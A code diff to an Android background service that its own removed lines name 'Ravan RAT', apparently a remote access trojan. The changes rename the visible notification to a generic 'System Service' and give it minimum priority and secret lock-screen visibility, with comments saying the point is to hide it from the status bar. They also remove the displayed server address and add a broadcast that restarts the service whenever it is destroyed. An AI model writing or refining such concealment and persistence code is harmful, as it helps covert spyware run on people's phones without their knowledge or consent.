@@ -60,6 +60,7 @@ public class HttpServerService extends Service {
             stopSelf();
         }
 
+        // Return START_STICKY to ensure the service restarts if killed
         return START_STICKY;
     }
 
@@ -89,11 +90,15 @@ public class HttpServerService extends Service {
 
     private void createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // Use IMPORTANCE_MIN to minimize intrusion (no sound, no status bar icon
+            // usually)
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "Ravan RAT Server",
-                    NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("HTTP Server running");
+                    "System Service",
+                    NotificationManager.IMPORTANCE_MIN);
+            channel.setDescription("Running background services");
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
 
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
@@ -106,18 +111,17 @@ public class HttpServerService extends Service {
                 this, 0, notificationIntent,
                 PendingIntent.FLAG_IMMUTABLE);
 
-        String ipv6 = MainActivity.getLocalIPv6Address();
-        String contentText = ipv6 != null
-                ? "Server running at http://[" + ipv6 + "]:8080"
-                : "Server running on port 8080";
-
+        // Minimized notification content
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("🛡️ Ravan RAT Active")
-                .setContentText(contentText)
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setContentTitle("System Service")
+                .setContentText("Running...")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
+                // Priority MIN makes it hidden from status bar on many devices
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setShowWhen(false)
                 .build();
     }
 
@@ -129,6 +133,10 @@ public class HttpServerService extends Service {
 
     @Override
     public void onDestroy() {
+        // Send broadcast to restart
+        Intent broadcastIntent = new Intent(this, RestartReceiver.class);
+        sendBroadcast(broadcastIntent);
+
         unregisterNetworkCallback();
         networkExecutor.shutdown();
         stopServer();
